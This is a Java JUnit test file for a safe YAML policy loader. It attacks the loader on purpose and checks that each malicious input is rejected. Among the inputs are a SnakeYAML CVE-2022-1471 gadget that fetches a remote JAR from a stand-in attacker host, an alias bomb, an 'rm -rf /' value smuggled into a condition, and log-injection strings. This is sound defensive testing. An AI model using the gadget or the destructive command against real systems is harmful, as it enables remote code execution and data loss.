package dev.dwarpal.policy;

import dev.dwarpal.Fixtures;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Includes abuse cases: the policy file is attack surface, so we attack it ourselves. */
class SafePolicyLoaderTest {

    private final SafePolicyLoader loader = new SafePolicyLoader();

    private static final String HEADER = """
            version: "t-1"
            algorithm: DENY_OVERRIDES
            default: DENY
            """;

    @Test
    void loadsTheReferencePolicySet() {
        PolicySet set = loader.load(Fixtures.resource("/policies/default-policy.yaml"));
        assertEquals("2026.11.01-1", set.version());
        assertEquals(CombiningAlgorithm.DENY_OVERRIDES, set.algorithm());
        assertEquals(Effect.DENY, set.defaultEffect());
        assertEquals(9, set.policies().size());
    }

    @Test
    void cve2022_1471_globalTagGadgetIsRejectedAndNothingIsInstantiated() {
        // Classic SnakeYAML RCE gadget: would load a remote JAR via ScriptEngineManager.
        String payload = """
                version: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.invalid/x.jar"]]]]
                algorithm: DENY_OVERRIDES
                default: DENY
                policies: []
                """;
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(payload));
        assertTrue(e.getMessage().contains("not valid safe YAML"), e.getMessage());
    }

    @Test
    void billionLaughsAliasBombIsRejected() {
        // Structurally valid policy file, so only the alias limit can stop it.
        String bomb = HEADER + """
                policies:
                  - id: P-1
                    when:
                      roleIn: &a ["x","x","x","x","x","x","x","x","x"]
                    effect: DENY
                  - id: P-2
                    when:
                      roleIn: *a
                    effect: DENY
                """;
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(bomb));
        assertTrue(e.getMessage().contains("not valid safe YAML"), e.getMessage());
    }

    @Test
    void duplicateKeysAreRejectedSoASecondEffectCannotHideInReview() {
        String yaml = HEADER + """
                policies:
                  - id: P-1
                    when: {always: true}
                    effect: DENY
                    effect: PERMIT
                """;
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(yaml));
        assertTrue(e.getMessage().contains("not valid safe YAML"), e.getMessage());
    }

    @Test
    void typoInAKeyIsAnErrorNotSilentlyIgnored() {
        String yaml = HEADER + """
                policies:
                  - id: P-1
                    when: {always: true}
                    efect: DENY
                """;
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(yaml));
        assertTrue(e.getMessage().contains("efect"), e.getMessage());
    }

    @Test
    void unknownConditionIsRejected() {
        String yaml = HEADER + """
                policies:
                  - id: P-1
                    when: {runScript: "rm -rf /"}
                    effect: PERMIT
                """;
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(yaml));
        assertTrue(e.getMessage().contains("unknown condition"), e.getMessage());
    }

    @Test
    void norwayProblemUnquotedNoIsRejectedNotTreatedAsFalse() {
        String yaml = HEADER + """
                policies:
                  - id: P-1
                    when: {countryIn: [IN, NO]}
                    effect: PERMIT
                """;
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(yaml));
        assertTrue(e.getMessage().contains("countryIn"), e.getMessage());
    }

    @Test
    void excessiveNestingIsRejected() {
        String deep = "{not: ".repeat(SafePolicyLoader.MAX_CONDITION_DEPTH + 1) + "{always: true}"
                + "}".repeat(SafePolicyLoader.MAX_CONDITION_DEPTH + 1);
        String yaml = HEADER + "policies:\n  - id: P-1\n    when: " + deep + "\n    effect: DENY\n";
        assertThrows(PolicyLoadException.class, () -> loader.load(yaml));
    }

    @Test
    void oversizedFileIsRejectedBeforeParsing() {
        String huge = HEADER + "policies: []\n#" + "x".repeat(SafePolicyLoader.MAX_BYTES);
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(huge));
        assertTrue(e.getMessage().contains("exceeds"), e.getMessage());
    }

    @Test
    void missingDefaultIsRejected() {
        String yaml = """
                version: "t-1"
                algorithm: DENY_OVERRIDES
                policies: []
                """;
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(yaml));
        assertTrue(e.getMessage().contains("default"), e.getMessage());
    }

    @Test
    void logInjectionInIdentifiersIsRejected() {
        String yaml = HEADER + """
                policies:
                  - id: "P-1\\n2026-11-01 ALLOW admin"
                    when: {always: true}
                    effect: DENY
                """;
        assertThrows(PolicyLoadException.class, () -> loader.load(yaml));
    }

    @Test
    void linterErrorsBlockDeployment() {
        String yaml = HEADER + """
                policies:
                  - id: P-1
                    when: {roleIn: [finance]}
                    effect: PERMIT
                  - id: P-2
                    when: {roleIn: [finance]}
                    effect: DENY
                """;
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(yaml));
        assertTrue(e.getMessage().contains("conflicts"), e.getMessage());
    }

    @Test
    void wrongTypesAndBadEnumsGiveClearPaths() {
        assertThrows(PolicyLoadException.class, () -> loader.load("- just a list"));
        assertThrows(PolicyLoadException.class, () -> loader.load(HEADER + "policies: {}"));
        assertThrows(PolicyLoadException.class, () -> loader.load(HEADER
                + "policies:\n  - id: P-1\n    when: {riskAbove: high}\n    effect: DENY\n"));
        assertThrows(PolicyLoadException.class, () -> loader.load(HEADER
                + "policies:\n  - id: P-1\n    when: {deviceManaged: maybe}\n    effect: DENY\n"));
        assertThrows(PolicyLoadException.class, () -> loader.load(HEADER
                + "policies:\n  - id: P-1\n    when: {always: false}\n    effect: DENY\n"));
        assertThrows(PolicyLoadException.class, () -> loader.load(HEADER
                + "policies:\n  - id: P-1\n    when: {all: []}\n    effect: DENY\n"));
        assertThrows(PolicyLoadException.class, () -> loader.load(HEADER
                + "policies:\n  - id: P-1\n    when: {roleIn: [a], countryIn: [IN]}\n    effect: DENY\n"));
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(HEADER
                + "policies:\n  - id: P-1\n    when: {always: true}\n    effect: MAYBE\n"));
        assertTrue(e.getMessage().contains("policies[0].effect"), e.getMessage());
        assertThrows(PolicyLoadException.class, () -> loader.load(HEADER
                + "policies:\n  - id: P-1\n    when: {riskAbove: 1.5}\n    effect: DENY\n"));
    }

    @Test
    void nanAndInfinityThresholdsAreRejected() {
        for (String v : List.of(".nan", ".inf", "-.inf")) {
            assertThrows(PolicyLoadException.class, () -> loader.load(HEADER
                    + "policies:\n  - id: P-1\n    when: {riskAbove: " + v + "}\n    effect: DENY\n"), v);
        }
    }

    @Test
    void errorMessagesCannotCarryInjectedLines() {
        String yaml = HEADER + """
                policies:
                  - id: P-1
                    "when\\nFAKE LOG LINE": {always: true}
                    effect: DENY
                """;
        PolicyLoadException e = assertThrows(PolicyLoadException.class, () -> loader.load(yaml));
        assertFalse(e.getMessage().contains("\n"), e.getMessage());
        assertTrue(e.getMessage().contains("\\u000a"), e.getMessage());
    }

    @Test
    void parserErrorsDoNotEchoFileContentOrKeepTheRawCause() {
        PolicyLoadException e = assertThrows(PolicyLoadException.class,
                () -> loader.load("version: \"t\"\nsecret_token: [unclosed"));
        assertFalse(e.getMessage().contains("secret_token"), e.getMessage());
        assertTrue(e.getMessage().contains("line"), e.getMessage());
        assertEquals(null, e.getCause());
    }

    @Test
    void descriptionsAreSanitised() {
        PolicySet set = loader.load(HEADER + """
                policies:
                  - id: P-1
                    description: "line1\\nline2"
                    when: {roleIn: [a]}
                    effect: PERMIT
                """);
        assertEquals("line1\\u000aline2", set.policies().get(0).description());
    }

    @Test
    void everyConditionKindCompiles() {
        String yaml = HEADER + """
                policies:
                  - id: P-1
                    description: kitchen sink
                    when:
                      any:
                        - roleIn: [a]
                        - departmentIn: [d]
                        - countryIn: ["IN"]
                        - regionIn: [mumbai]
                        - resourceIdIn: [wiki]
                        - subjectType: WORKLOAD
                        - resourceKind: WEB
                        - classificationAtLeast: CONFIDENTIAL
                        - classificationAtMost: PUBLIC
                        - deviceHealthyWithAssurance: HARDWARE_ATTESTED
                        - actionIn: [ADMIN, DOWNLOAD]
                        - deviceManaged: false
                        - riskAbove: 0.5
                        - not: {always: true}
                    effect: DENY
                """;
        PolicySet set = loader.load(yaml);
        assertEquals(1, set.policies().size());
    }
}
